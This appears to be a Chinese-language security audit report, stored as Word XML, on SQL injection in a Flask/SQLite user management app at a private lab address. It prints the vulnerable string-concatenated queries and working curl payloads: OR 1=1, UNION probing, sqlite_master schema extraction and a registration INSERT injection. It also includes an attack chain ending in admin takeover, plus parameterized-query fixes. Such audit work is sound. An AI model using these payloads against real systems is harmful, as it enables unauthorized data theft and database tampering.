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用户管理系统 SQL注入漏洞审计报告</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>目标：</w:t>
      </w:r>
      <w:r>
        <w:t>http://192.168.119.128:5000</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:br/>
        <w:t>应用：</w:t>
      </w:r>
      <w:r>
        <w:t>用户管理系统（Flask + SQLite3）</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:br/>
        <w:t>审计日期：</w:t>
      </w:r>
      <w:r>
        <w:t>2026-07-08</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>============================================================</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>漏洞概述</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>该系统在"今天优化"后新增/修改了多个功能，引入了严重的 SQL 注入漏洞。所有注入点均使用字符串拼接方式执行 SQL 语句，未使用参数化查询。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>高危漏洞1：搜索功能 SQL注入（主页/搜索API）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>漏洞代码</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>文件：app.py</w:t>
        <w:br/>
        <w:t>位置：index() 路由（首页）和 search() 路由</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># 搜索功能（首页搜索 &amp; /search API）</w:t>
        <w:br/>
        <w:t>keyword = request.args.get("keyword", "").strip()</w:t>
        <w:br/>
        <w:t>sql = f"SELECT * FROM users WHERE username LIKE '%{keyword}%' OR email LIKE '%{keyword}%'"</w:t>
        <w:br/>
        <w:t>c.execute(sql)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>攻击路径</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    GET /search?keyword=[注入载荷]</w:t>
        <w:br/>
        <w:t xml:space="preserve">    GET /?keyword=[注入载荷]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>PoC（概念验证）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># 基础注入 -- 返回所有用户</w:t>
        <w:br/>
        <w:t>curl "http://192.168.119.128:5000/search?keyword=test'%20OR%201=1--"</w:t>
        <w:br/>
        <w:br/>
        <w:t># 返回全部10个用户数据，包括管理员</w:t>
        <w:br/>
        <w:t># {"results":[</w:t>
        <w:br/>
        <w:t>#   {"email":"admin@example.com","id":1,...},</w:t>
        <w:br/>
        <w:t>#   ...</w:t>
        <w:br/>
        <w:t># ]}</w:t>
        <w:br/>
        <w:br/>
        <w:t># 确认列数（5列UNION查询）</w:t>
        <w:br/>
        <w:t xml:space="preserve">curl "http://192.168.119.128:5000/search?keyword=test'%20UNION%20SELECT%201,2,3,4,5--" </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>漏洞证明</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>请求：GET /search?keyword=test' OR 1=1--</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>结果：返回数据库中所有用户信息（10个用户）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>危害：</w:t>
      </w:r>
      <w:r>
        <w:t>可遍历所有用户数据，包括管理员账户信息</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>高危漏洞2：注册功能 SQL注入</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>漏洞代码</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>文件：app.py</w:t>
        <w:br/>
        <w:t>位置：register() 路由</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>@app.route("/register", methods=["GET", "POST"])</w:t>
        <w:br/>
        <w:t>def register():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    username = request.form.get("username", "").strip()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    password = request.form.get("password", "")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    email = request.form.get("email", "").strip()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    phone = request.form.get("phone", "").strip()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    # 直接拼接 SQL，完全未过滤！</w:t>
        <w:br/>
        <w:t xml:space="preserve">    sql = f"INSERT INTO users (username, password, email, phone) VALUES ('{username}', '{password}', '{email}', '{phone}')"</w:t>
        <w:br/>
        <w:t xml:space="preserve">    c.execute(sql)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>攻击路径</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    POST /register</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Content-Type: application/x-www-form-urlencoded</w:t>
        <w:br/>
        <w:t xml:space="preserve">    username=[注入载荷]&amp;password=***&amp;email=xxx&amp;phone=xxx</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>PoC</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># 注入点：username 参数，插入恶意数据</w:t>
        <w:br/>
        <w:t>curl -X POST "http://192.168.119.128:5000/register" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d "username=test_hack', 'injected_pwd', 'hack@x.com', '99999'); --&amp;password=***&amp;email=y&amp;phone=z"</w:t>
        <w:br/>
        <w:br/>
        <w:t># 响应：注册成功，请登录</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>漏洞证明</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>请求：POST /register with username = test_hack' 注入</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>结果：注册成功，恶意数据写入数据库</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>危害：</w:t>
      </w:r>
      <w:r>
        <w:t>攻击者可向数据库任意写入数据</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>中危漏洞3：SQLite信息窃取</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>含数据窃取的 PoC</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># 提取所有表名</w:t>
        <w:br/>
        <w:t>curl -s -G "http://192.168.119.128:5000/search" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  --data-urlencode "keyword=test' UNION SELECT 1,GROUP_CONCAT(name),3,4,5 FROM sqlite_master WHERE type='table'--"</w:t>
        <w:br/>
        <w:br/>
        <w:t># 提取 users 表的列结构</w:t>
        <w:br/>
        <w:t>curl -s -G "http://192.168.119.128:5000/search" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  --data-urlencode "keyword=test' UNION SELECT 1,GROUP_CONCAT(sql),3,4,5 FROM sqlite_master WHERE name='users'--" </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>优化前后的对比分析</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>优化前（bak2 版本）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  - 无数据库功能，无搜索，无注册</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  - 用户数据硬编码在 USERS 字典中</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>优化后（当前版本）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新增功能</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>安全性</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>数据库功能（SQLite）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>引入注入入口</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>搜索功能（主页 + /search）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>SQL注入</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>用户注册功能（/register）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>SQL注入</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>密码加密优化（bcrypt）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>正确</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Session安全优化 + 动态secret key</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>正确</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>影响范围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漏洞总数</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>3个（2高1中）</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>受影响数据</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>所有用户信息（username, email, phone, id）</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>攻击前置条件</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>无需登录，无需认证</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>利用难度</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>低（无需特殊工具，curl即可利用）</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>修复建议</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>根本修复：使用参数化查询</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># 搜索功能修复</w:t>
        <w:br/>
        <w:t>keyword = request.args.get("keyword", "").strip()</w:t>
        <w:br/>
        <w:t>sql = "SELECT * FROM users WHERE username LIKE ? OR email LIKE ?"</w:t>
        <w:br/>
        <w:t>c.execute(sql, ('%' + keyword + '%', '%' + keyword + '%'))</w:t>
        <w:br/>
        <w:br/>
        <w:t># 注册功能修复</w:t>
        <w:br/>
        <w:t>sql = "INSERT INTO users (username, password, email, phone) VALUES (?, ?, ?, ?)"</w:t>
        <w:br/>
        <w:t>c.execute(sql, (username, password, email, phone))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>补充修复</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>1. 限制 /search 接口的返回值数量，防止数据批量泄露</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>2. 注册功能中对密码进行哈希处理后再存储</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>3. 用户ID、密码字段在前端和后端均做脱敏处理</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>4. 添加 X-Content-Type-Options、CSP 等安全响应头</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>攻击链组合</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>注册功能SQL注入</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ↓</w:t>
        <w:br/>
        <w:t>向数据库写入恶意数据</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ↓</w:t>
        <w:br/>
        <w:t>搜索功能SQL注入</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ↓</w:t>
        <w:br/>
        <w:t>提取所有用户信息</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ↓</w:t>
        <w:br/>
        <w:t>利用管理员信息尝试登录后台</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ↓</w:t>
        <w:br/>
        <w:t>获取完整系统控制权</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>--- 报告结束 ---</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>报告生成日期：2026-07-08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